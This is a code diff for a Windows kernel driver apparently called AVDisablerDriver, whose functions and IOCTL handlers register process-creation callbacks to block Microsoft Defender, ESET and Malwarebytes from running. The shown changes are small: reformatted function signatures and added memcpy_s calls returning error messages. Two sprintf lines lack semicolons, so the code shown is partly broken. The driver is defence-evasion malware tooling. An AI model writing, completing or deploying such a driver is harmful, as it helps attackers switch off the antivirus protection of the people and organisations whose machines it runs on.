@@ -31,7 +31,9 @@ BOOLEAN g_IsDefenderCallbackRoutineSet = FALSE;
 BOOLEAN g_IsEsetCallbackRoutineSet = FALSE;
 BOOLEAN g_IsMalwareBytesCallbackRoutineSet = FALSE;
 
-void PreventDefenderProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
+void PreventDefenderProcessCreate(PEPROCESS Process,
+								  HANDLE ProcessId,
+								  PPS_CREATE_NOTIFY_INFO CreateInfo)
 {
 
 	NTSTATUS status = STATUS_SUCCESS;
@@ -70,7 +72,9 @@ void PreventDefenderProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREAT
 	}
 }
 
-void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
+void PreventEsetProcessCreate(PEPROCESS Process,
+								  HANDLE ProcessId,
+								  PPS_CREATE_NOTIFY_INFO CreateInfo)
 {
 
 	NTSTATUS status = STATUS_SUCCESS;
@@ -176,6 +180,7 @@ NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 			{
 				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_ESET: Failed to set ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status)
 				KdPrint((OutputBuffer));
+				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
 				return CompleteRequest(status, Irp, 0);
 			}
 
@@ -190,7 +195,6 @@ NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 			PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
 			if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
 			{
-				//sprintf();
 				KdPrint(("AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: invalid size of input buffer!\n"));
 				return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
 
@@ -201,6 +205,7 @@ NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 			{
 				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Failed to set Malwarebyte's related process creation callback routine\n (NTSTATUS: 0x%x)", status)
 				KdPrint((OutputBuffer));
+				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
 				return CompleteRequest(status, Irp, 0);
 			}
 
